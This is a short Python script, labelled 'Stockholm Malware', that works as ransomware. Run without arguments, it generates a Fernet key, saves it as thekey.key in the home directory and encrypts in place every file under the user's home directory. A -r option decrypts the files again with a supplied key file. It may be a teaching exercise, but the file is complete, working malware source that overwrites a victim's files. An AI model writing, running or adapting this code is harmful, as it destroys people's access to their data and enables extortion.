import argparse
import os
from cryptography.fernet import Fernet

version = '1.0.0'

def parse_args():
    parser = argparse.ArgumentParser(description='Stockholm Malware')
    group = parser.add_mutually_exclusive_group(required=False)
    group.add_argument('-r', type=str, help='Key to decrypt')
    group.add_argument('-s', action="store_true",  help='Encrypt with silent mode')
    group.add_argument('-v', version=f"stockholm version: {version}", action='version')
    return parser.parse_args()

def decrypt(key_file: str) -> None:
    '''
    @param key_file: key_file to decrypt
    '''
    try:
        home_dir = os.path.expanduser("~")
        key_file = os.path.join(home_dir, key_file)
        with open(key_file, 'rb') as thekey:
            key = thekey.read()
            print(f"Key: {key}")
        fernet = Fernet(key)

        file_list = all_files_in_home_dir('stockholm.py', key_file)
        for file in file_list:
            print(f"Decrypting file: {file}")
            with open(file, 'rb') as f:
                token = f.read()
            decrypt = fernet.decrypt(token)
            with open(file, 'wb') as f:
                f.write(decrypt)
        
    except FileNotFoundError:
        print("Key file not found")

def all_files_in_home_dir(prog: str, key_file: str) -> list:
    '''
    @param prog: program name
    @param key_file: key file to decrypt
    '''
    home_dir = os.path.expanduser("~")
    file_list = []
    for root, _, files in os.walk(home_dir):
        for file in files:
            absolute_path = os.path.join(root, file)
            if absolute_path == key_file:
                continue
            if file == prog:
                continue
            if os.path.isfile(absolute_path):
                file_list.append(absolute_path)
    return file_list

def encrypt(is_silent=False) -> None:
    # if is_silent:
    #     print("work in silent mode")
    # else:
    #     print("work in verbose mode")

    home_dir = os.path.expanduser("~")

    key = Fernet.generate_key()
    print(f"Key: {key}")

    # create README file with the key
    key_file = os.path.join(home_dir, 'thekey.key')
    with open(key_file, 'wb') as thekey:
        thekey.write(key)

    file_list = all_files_in_home_dir('stockholm.py', key_file)
    for file in file_list:
        print(f"Encrypting file: {file}")
        with open(file, 'rb') as f:
            data = f.read()
        fernet = Fernet(key).encrypt(data)
        with open(file, 'wb') as f:
            f.write(fernet)

if __name__ == '__main__':
    args = parse_args()
    if args.r:
        decrypt(args.r)
    else:
        encrypt(is_silent=args.s)